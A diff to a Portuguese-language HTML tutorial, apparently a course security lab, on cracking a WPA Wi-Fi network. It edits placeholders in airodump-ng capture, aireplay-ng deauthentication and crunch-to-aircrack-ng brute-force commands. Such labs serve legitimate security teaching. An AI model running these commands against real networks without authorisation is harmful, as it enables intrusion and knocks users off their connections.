@@ -128,7 +128,7 @@ Após selecionar a rede alvo, utilizaremos algumas de suas informações. Você 
 <p>
 Agora que temos a rede alvo, iremos monitorá-la usando algumas das informações adquiridas que guardamos em um bloco de notas anteriormente. É importante que pelo menos 300 pacotes de dados tenham passado pela rede para garantir que o WPA HANDSHAKE seja capturado.
 <p>
-<pre><code>airodump-ng -c <canal_da_rede_alvo> --bssid [bssid_da_rede_alvo] -w dados
+<pre><code>airodump-ng -c [canal_da_rede_alvo] --bssid [bssid_da_rede_alvo] -w dados
 </code></pre>
 </p>
 <img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/airodump.png"/>
@@ -136,7 +136,7 @@ Agora que temos a rede alvo, iremos monitorá-la usando algumas das informaçõe
 <p>
 Hora de capturar o tão esperado WPA HANDSHAKE. Para que seja capturado, é preciso que alguém se conecte à rede. Há duas opções: você espera a oportunidade que algum usuário se conecte ou você pode desautenticar quem já está conectado e capturar o WPA HANDSHAKE logo que o usuário se reconectar. Usaremos a segunda opção!
 <p>
-<pre><code>aireplay-ng -0 10 -a <BSSID> wlanmon
+<pre><code>aireplay-ng -0 10 -a [bssid_da_rede_alvo] wlanmon
 </code></pre>
 </p>
 <img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/aireplay-ng.png"/>
@@ -153,7 +153,7 @@ aircrack-ng dados-01.cap
 <p>
 Hora de quebrar no Brute Force:
 <p>
-<pre><code>crunch 10 10 <padrão> ...
+<pre><code>crunch [min] [max] [padrão] | aircrack-ng [dados-01.cap] -w - -e [essid_da_rede_alvo]
 </code></pre>
 </p>
 </p>
